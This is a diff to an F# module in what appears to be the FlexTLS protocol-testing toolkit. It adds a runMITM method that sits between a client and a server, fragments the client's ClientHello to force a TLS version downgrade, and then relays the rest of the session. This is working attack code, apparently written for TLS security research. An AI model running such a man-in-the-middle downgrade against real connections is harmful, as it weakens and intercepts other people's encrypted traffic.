@@ -3,21 +3,24 @@
 module FlexApps.Attack_FragmentClientHello
 
 open Bytes
+open Error
 open TLSInfo
 open TLSConstants
 
-open FlexTLS.FlexTypes
-open FlexTLS.FlexConstants
-open FlexTLS.FlexConnection
-open FlexTLS.FlexClientHello
-open FlexTLS.FlexServerHello
-open FlexTLS.FlexCertificate
-open FlexTLS.FlexServerHelloDone
-open FlexTLS.FlexClientKeyExchange
-open FlexTLS.FlexCCS
-open FlexTLS.FlexFinished
-open FlexTLS.FlexState
-open FlexTLS.FlexSecrets
+open FlexTLS
+open FlexTypes
+open FlexConstants
+open FlexConnection
+open FlexHandshake
+open FlexClientHello
+open FlexServerHello
+open FlexCertificate
+open FlexServerHelloDone
+open FlexClientKeyExchange
+open FlexCCS
+open FlexFinished
+open FlexState
+open FlexSecrets
 
 
 
@@ -25,7 +28,6 @@ open FlexTLS.FlexSecrets
 type Attack_FragmentClientHello =
     class
 
-    (* Run a full Handshake RSA with server side authentication only *)
     static member run (server_name:string, ?port:int, ?fp:fragmentationPolicy) : unit =
         let port = defaultArg port FlexConstants.defaultTCPPort in
         let fp = defaultArg fp (All(5)) in
@@ -59,5 +61,30 @@ type Attack_FragmentClientHello =
         let verify_data  = FlexSecrets.makeVerifyData nsc.si nsc.keys.ms Server (log @| ffC.payload) in
         let st,ffS       = FlexFinished.receive(st,verify_data) in
         ()
+
+    static member runMITM (accept, server_name:string, ?port:int) : state * state =
+        let port = defaultArg port FlexConstants.defaultTCPPort in
+
+        // Start being a server
+        let sst,_ = FlexConnection.serverOpenTcpConnection("0.0.0.0",port=6666) in
+        let sst,nsc,sch = FlexClientHello.receive(sst) in
+        if not (sch.pv = TLS_1p2 || sch.pv = TLS_1p1) then
+            failwith "Fragmented ClientHello should use TLS > 1.0 to demonstrate the downgrade"
+        else
+
+        // Start being a client
+        let cst,_   = FlexConnection.clientOpenTcpConnection(server_name,server_name,port) in
+        
+        // Reuse the honest client hello message, but apply fragmentation
+        let cst     = FlexHandshake.send(cst,sch.payload,One(5)) in
+        let cst     = FlexHandshake.send(cst) in
+
+        // Forward server hello
+        let cst,_,csh   = FlexServerHello.receive(cst,sch,nsc) in
+        let sst = FlexHandshake.send(sst,csh.payload) in
+
+        // Forward the rest of the handshake and the application data
+        FlexConnection.passthrough(cst.ns,sst.ns);
+        cst,sst
 
     end
